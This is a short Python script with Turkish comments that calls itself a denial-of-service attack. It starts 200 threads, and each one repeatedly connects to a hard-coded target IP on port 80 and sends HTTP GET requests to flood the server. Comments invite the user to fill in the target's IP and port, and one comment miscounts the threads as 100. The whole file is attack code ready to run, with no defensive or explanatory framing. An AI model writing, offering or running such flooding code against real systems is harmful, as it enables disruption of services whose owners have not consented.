import socket
import threading

# Hedef IP ve Port
target_ip = "192.168.1.18"  # hedefin IP'sini girin
target_port = 80            # hedefin Portunu girin

# Saldırı fonksiyonu
def dos_attack():
    while True:
        try:
            # Soket oluştur
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            
            # Rastgele veri gönder
            sock.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
            sock.close()
        except Exception as e:
            print(f"Bir hata oluştu: {e}")
            break

# Çoklu iş parçacığı kullanarak saldırıyı hızlandır
threads = []
for i in range(200):  # 100 iş parçacığı oluştur
    thread = threading.Thread(target=dos_attack)
    thread.start()
    threads.append(thread)

# Iş parçacıklarını tamamla
for thread in threads:
    thread.join()
